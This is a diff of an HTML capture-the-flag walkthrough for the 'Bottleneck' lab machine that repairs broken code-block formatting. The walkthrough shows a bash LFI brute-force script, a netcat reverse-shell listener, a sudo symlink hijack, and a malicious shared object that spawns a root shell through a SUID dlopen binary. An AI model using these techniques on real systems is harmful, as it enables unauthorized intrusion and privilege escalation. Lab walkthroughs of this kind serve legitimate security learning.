@@ -1078,48 +1078,46 @@ In my case I have used the following bash code, that should execute each code in
 ../../tmp/output
 ../tmp/output
 </code></pre></div>    </div>
-    <p>Please note that this payload is python based since the <code class="highlighter-rouge">ids_strong_bvb.py</code> should execute it. My original bash code is as follow
-```
-#!/bin/bash
-url=$1
-wordlist=$2
-loop=0
-[ $# != 2 ] &amp;&amp; { echo “Usage: $0 url wordlist”; exit 1; }
-checksum=”d41d8cd98f00b204e9800998ecf8427e”</p>
+    <p>Please note that this payload is python based since the <code class="highlighter-rouge">ids_strong_bvb.py</code> should execute it. My original bash code is as follow</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nv">url</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">wordlist</span><span class="o">=</span><span class="nv">$2</span>
+<span class="nv">loop</span><span class="o">=</span>0
+<span class="o">[</span> <span class="nv">$# </span><span class="o">!=</span> 2 <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> url wordlist"</span><span class="p">;</span> <span class="nb">exit </span>1<span class="p">;</span> <span class="o">}</span>
+<span class="nv">checksum</span><span class="o">=</span><span class="s2">"d41d8cd98f00b204e9800998ecf8427e"</span>
+<span class="k">while </span><span class="nb">read </span>file<span class="p">;</span>
+<span class="k">do
+ </span><span class="nv">loop</span><span class="o">=</span><span class="sb">`</span><span class="nb">expr</span> <span class="nv">$loop</span> + 1<span class="sb">`</span>
+ <span class="nb">echo</span> <span class="s2">"[+] Loop number: </span><span class="nv">$loop</span><span class="s2">"</span>
+ <span class="nb">echo</span> <span class="s2">"[+] Test file: </span><span class="nv">$file</span><span class="s2">"</span>
+ <span class="nb">echo</span> <span class="s2">"[+] GET reqest: </span><span class="nv">$url</span><span class="s2">?t=</span><span class="k">$(</span><span class="nb">date</span> +%s<span class="k">)</span><span class="s2">&amp;f=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span>| <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="k">)</span><span class="s2">"</span>
+ <span class="nb">echo</span> <span class="s2">"[+] Script run: python /opt/ids_strong_bvb.py &lt;/var/log/soc/'.</span><span class="nv">$file</span><span class="s2">.' &gt;/tmp/output 2&gt;&amp;1"</span><span class="p">;</span>
+ <span class="nb">echo</span> <span class="s2">"[+] Base64: </span><span class="k">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$file</span>| <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="k">)</span><span class="s2">"</span>
+ curl <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$url</span><span class="s2">?t=</span><span class="k">$(</span><span class="nb">date</span> +%s<span class="k">)</span><span class="s2">&amp;f=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span>| <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="k">)</span><span class="s2">"</span> <span class="nt">-o</span> <span class="s2">"</span><span class="nv">$loop</span><span class="s2">.txt"</span><span class="p">;</span>
+ <span class="nb">echo</span> <span class="s2">"-------------time: </span><span class="k">$(</span><span class="nb">date</span> +%s<span class="k">)</span><span class="s2"> ---------"</span>
+ <span class="nb">echo</span> <span class="s2">"------------read-file-</span><span class="nv">$loop</span><span class="s2">------------"</span>
+ <span class="nb">cat</span> ./<span class="s2">"</span><span class="nv">$loop</span><span class="s2">.txt"</span>
+ <span class="nv">filesum</span><span class="o">=</span><span class="k">$(</span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$loop</span><span class="s2">.txt"</span> | <span class="nb">md5sum</span>|awk <span class="s1">'{print $1}'</span><span class="k">)</span>
+ <span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$checksum</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"</span><span class="nv">$filesum</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span>
+ <span class="k">then
+     </span><span class="nb">echo</span> <span class="s2">"[+] Found new file: </span><span class="nv">$loop</span><span class="s2">.txt"</span>
+     <span class="nb">echo</span> <span class="s2">"[+] URL: </span><span class="nv">$url</span><span class="s2">?t=</span><span class="k">$(</span><span class="nb">date</span> +%s<span class="k">)</span><span class="s2">&amp;f=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$file</span>| <span class="nb">base64</span><span class="k">)</span><span class="s2">"</span>
+     <span class="nb">cat</span> <span class="nv">$loop</span>.txt
+     <span class="nb">break
+ </span><span class="k">fi
+done</span> &lt; <span class="nv">$wordlist</span>
+</code></pre></div>    </div>
+    <p>You can see that my code do some checksum with the value <code class="highlighter-rouge">d41d8cd98f00b204e9800998ecf8427e</code> which is the value of empty file. Then run it with the following command.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./lfi_base.sh http://192.168.166.22/image_gallery.php ./payload.txt
+</code></pre></div>    </div>
+    <p>Also please note that I have been test it may times before I got it to work, this is really hard machine I think that requires a lot of concentration and understanding of code, in this case PHP.</p>
   </li>
-</ol>
-
-<p>while read file;
-do
-	loop=<code class="highlighter-rouge">expr $loop + 1</code>
-	echo “[+] Loop number: $loop”
-	echo “[+] Test file: $file”
-	echo “[+] GET reqest: $url?t=$(date +%s)&amp;f=$(echo -n “$file”| base64 -w 0)”
-	echo “[+] Script run: python /opt/ids_strong_bvb.py &lt;/var/log/soc/’.$file.’ &gt;/tmp/output 2&gt;&amp;1”;
-	echo “[+] Base64: $(echo -n $file| base64 -w 0)”
-	curl -s “$url?t=$(date +%s)&amp;f=$(echo -n “$file”| base64 -w 0)” -o “$loop.txt”;
-	echo “————-time: $(date +%s) ———”
-	echo “————read-file-$loop————”
-	cat ./”$loop.txt”</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filesum=$(cat "$loop.txt" | md5sum|awk '{print $1}')
-if [[ "$checksum" == "$filesum" ]];
-then
-	echo "[+] Found new file: $loop.txt"
-	echo "[+] URL: $url?t=$(date +%s)&amp;f=$(echo -n $file| base64)"
-	cat $loop.txt
-	break
-fi done &lt; $wordlist ``` You can see that my code do some checksum with the falue `d41d8cd98f00b204e9800998ecf8427e` which is the value of empty file. Then run it with the following command. ``` ./lfi_base.sh http://192.168.166.22/image_gallery.php ./payload.txt ``` Also please note that I have been test it may times before I got it to work, this is really hard machine I think that requires a lot of concentration and understanding of code, in this case PHP.
-</code></pre></div></div>
-
-<ol>
   <li>
     <p>Initiation: so now after we have all set we can execute the code and on another terminal open listener for port 443.
 <img src="/assets/images/op-003.gif" alt="op-003.gif" />
 Please note, the last step (step 4) was long since we had to research on the WEB more to understand how to exploit the reference point and run remote code to gain access.</p>
   </li>
-  <li>
-    <p>Interactive Shell: Since the reverse shell we have  so far is not so compatible we can make it full interactive with the following, first start listiner on the kali</p>
+  <li>Interactive Shell: Since the reverse shell we have  so far is not so compatible we can make it full interactive with the following, first start listiner on the kali
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 443
 </code></pre></div>    </div>
     <p>then we just need to run on the target.</p>
@@ -1129,91 +1127,86 @@ Please note, the last step (step 4) was long since we had to research on the WEB
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bottleneck:~/html$ ^Z
 zsh: suspended  nc -nvlp 443
 </code></pre></div>    </div>
-    <p>As you can see I have type ctrl+Z to take the shell to background, then we just need to run more commands.
-```
-└─$ stty -a |cut -d’;’ -f2-3 | head -n1
-rows 15; columns 116</p>
-  </li>
-</ol>
-
-<p>└─$ stty raw -echo;fg<br />
-    stty rows 15 columns 116
+    <p>As you can see I have type ctrl+Z to take the shell to background, then we just need to run more commands.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ stty -a |cut -d';' -f2-3 | head -n1
+rows 15; columns 116
+└─$ stty raw -echo;fg  
+                 stty rows 15 columns 116
 www-data@bottleneck:~/html$
-www-data@bottleneck:~/html$ python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>After we finish we should have full interactive shell.
-
-7. System Enumeration: run full enumeration with linpeas, we can see one file that look interasting:
-</code></pre></div></div>
-<p>User www-data may run the following commands on bottleneck:
-    (bytevsbyte) NOPASSWD: /var/www/html/web_utils/clear_logs</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If we search for that clear_logs file we can see that it point to the following file:
-</code></pre></div></div>
-<p>/opt/clear_logs.sh</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This is mean that this file can be run without inserting password of bytevsbyte user, if we look at the file we can find the following, which is used to remove the logs that created from the php file that we have compromised.
-</code></pre></div></div>
-<p>www-data@bottleneck:~/html$ cat /var/www/html/web_utils/clear_logs
+www-data@bottleneck:~/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre></div>    </div>
+    <p>After we finish we should have full interactive shell.</p>
+  </li>
+  <li>System Enumeration: run full enumeration with linpeas, we can see one file that look interasting:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User www-data may run the following commands on bottleneck:
+ (bytevsbyte) NOPASSWD: /var/www/html/web_utils/clear_logs
+</code></pre></div>    </div>
+    <p>This is mean that we can run <code class="highlighter-rouge">sudo</code> as bytevsbyte without insert any password if the path is to that clear_logs file, if we search for that clear_logs file we can see that it point to the following file:</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/clear_logs.sh
+</code></pre></div>    </div>
+    <p>If we look at the file we can find the following, which is used to remove the logs that created from the php file that we have compromised.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bottleneck:~/html$ cat /var/www/html/web_utils/clear_logs
 #!/bin/bash
-rm -f /var/log/soc/intrusion_*</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If we run `ll` or `ls -la` on the same directory we can see the following interesting about that file.
-</code></pre></div></div>
-<p>www-data@bottleneck:~/html$ ls -la /var/www/html/web_utils/clear_logs
-lrwxrwxrwx 1 root root 18 Mar  2  2020 /var/www/html/web_utils/clear_logs -&gt; /opt/clear_logs.sh</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You can see that with www-data we have permission to change that symbolic link.
-
-8. Escalation: what we need next after we found that we can change the link so it point to other location, we just need to point it to /bin/bash for grabing bash as bytevsbyte user and then run it with sudo.
-</code></pre></div></div>
-<p>ln -sf /bin/bash /var/www/html/web_utils/clear_logs
-sudo -u bytevsbyte /var/www/html/web_utils/clear_logs</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>So now we can see that we are connected as bytevsbyte user.
-</code></pre></div></div>
-<p>www-data@bottleneck:~/html$ sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
+rm -f /var/log/soc/intrusion_*
+</code></pre></div>    </div>
+    <p>If we run <code class="highlighter-rouge">ll</code> or <code class="highlighter-rouge">ls -la</code> on the same directory we can see the following interesting about that file.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bottleneck:~/html$ ls -la /var/www/html/web_utils/clear_logs
+lrwxrwxrwx 1 root root 18 Mar  2  2020 /var/www/html/web_utils/clear_logs -&gt; /opt/clear_logs.sh
+</code></pre></div>    </div>
+    <p>You can see the value permission on that file is <code class="highlighter-rouge">lrwxrwxrwx</code>, which mean that with www-data we have permission to change that symbolic link.</p>
+  </li>
+  <li>Escalation: what we need next after we found that we can change the link so it point to other location, we just need to point it to /bin/bash for grabing bash as bytevsbyte user and then run it with sudo.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ln -sf /bin/bash /var/www/html/web_utils/clear_logs
+sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
+</code></pre></div>    </div>
+    <p>So now we can see that we are connected as bytevsbyte user.</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bottleneck:~/html$ sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
 bytevsbyte@bottleneck:~/html$ id
 uid=1000(bytevsbyte) gid=1000(bytevsbyte) groups=1000(bytevsbyte),4(adm),24(cdrom),30(dip),46(plugdev),1001(tester)
 bytevsbyte@bottleneck:~/html$ whoami
 bytevsbyte
-bytevsbyte@bottleneck:~/html$</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-9. System Enumeration: so know we can run linpeas as bytevsbyte use, we expect to see out output with that one. We have found the two files
-</code></pre></div></div>
-<p>-rw-r—– 1 root tester 281 Sep 27  2019 /usr/test/testlib.c
--rwsr-x— 1 root tester 16528 Sep 26  2019 /usr/test/testlib</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>looking on the source code we can see the following
-</code></pre></div></div>
-<p>#include <dlfcn.h>
-#include <unistd.h></unistd.h></dlfcn.h></p>
-
-<p>int main(int argc, char <em>argv[]){
-    void *handle;
-    int (</em>function)();
-    if(argc &lt; 2)
-        return 1;
-    handle = dlopen(argv[1], RTLD_LAZY);
-    function = dlsym(handle, “test_this”);
-    function();
-    return 0;
-}</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I have told you that this is hard machine, since we need to check each code we found, so in that case the code should get arg, one or more then one, and it run dlsym which take the arg and run it with test_this, this is mean we have insert path for `so` file that contain function called "test_this" file.
-So, in out case, dlopen is used to open the shared object file "&lt;any_name&gt;.so" with lazy binding (RTLD_LAZY). Then, dlsym is used to obtain the address of the function named "test_this" within the shared object, since that binary is set on suid of 0, this is mean we can binding root shell with that.
-</code></pre></div></div>
-<p>#include <stdio.h>
-#include <stdlib.h>
+bytevsbyte@bottleneck:~/html$
+</code></pre></div>    </div>
+  </li>
+  <li>System Enumeration: so now we can run linpeas as bytevsbyte user, we expect to see different output. We have found the two files
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rw-r----- 1 root tester 281 Sep 27  2019 /usr/test/testlib.c
+-rwsr-x--- 1 root tester 16528 Sep 26  2019 /usr/test/testlib
+</code></pre></div>    </div>
+    <p>looking on the source code we can see the following</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;dlfcn.h&gt;
+#include &lt;unistd.h&gt;
+int main(int argc, char *argv[]){
+ void *handle;
+ int (*function)();
+ if(argc &lt; 2)
+     return 1;
+ handle = dlopen(argv[1], RTLD_LAZY);
+ function = dlsym(handle, "test_this");
+ function();
+ return 0;
+}
+</code></pre></div>    </div>
+    <p>I have told you that this is hard machine, since we need to check each code we found, so in that case the code should get arg, one or more then one, and it run dlsym which take the arg and run it with test_this, this is mean we have insert path for <code class="highlighter-rouge">so</code> file that contain function called “test_this” file.
+So, in out case, dlopen is used to open the shared object file “<any_name>.so" with lazy binding (RTLD_LAZY). Then, dlsym is used to obtain the address of the function named "test_this" within the shared object, since that binary is set with suid of 0, this is mean we can binding root shell with that.</any_name></p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
 #include &lt;sys/types.h&gt;
-#include <unistd.h>
+#include &lt;unistd.h&gt;
 void test_this()
 {
-setuid(0); setgid(0); system("/bin/sh");</unistd.h></stdlib.h></stdio.h></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-10. Root Escalation: so now, transfer that file to the target and change it's mode to execute, and then run the following to gain shell as root.
-</code></pre></div></div>
-<p>bytevsbyte@bottleneck:/usr/test$ ./testlib /tmp/tmp/test_this.so</p>
-<h1 id="id">id</h1>
-<p>uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(bytevsbyte),1001(tester)</p>
-<h1 id="whoami">whoami</h1>
-<p>root
+setuid(0); setgid(0); system("/bin/sh");
+</code></pre></div>    </div>
+  </li>
+  <li>Root Escalation: so now, transfer that file to the target and change it’s mode to execute, and then run the following to gain shell as root.
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bytevsbyte@bottleneck:/usr/test$ ./testlib /tmp/tmp/test_this.so
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(bytevsbyte),1001(tester)
+# whoami
+root
 #
-```</p>
-
-<h3 id="bottleneck-1">Bottleneck</h3>
+</code></pre></div>    </div>
+  </li>
+</ol>
 
 <h3 id="brokengallery">BrokenGallery</h3>
 
@@ -1222,6 +1215,8 @@ setuid(0); setgid(0); system("/bin/sh");</unistd.h></stdlib.h></stdio.h></p>
 <h3 id="dawn3">Dawn3</h3>
 
 <h4 id="final-table-methodology-1">Final table methodology</h4>
+
+<h2 id="10-points-box-methodology">10 points box methodology</h2>
 
     
 
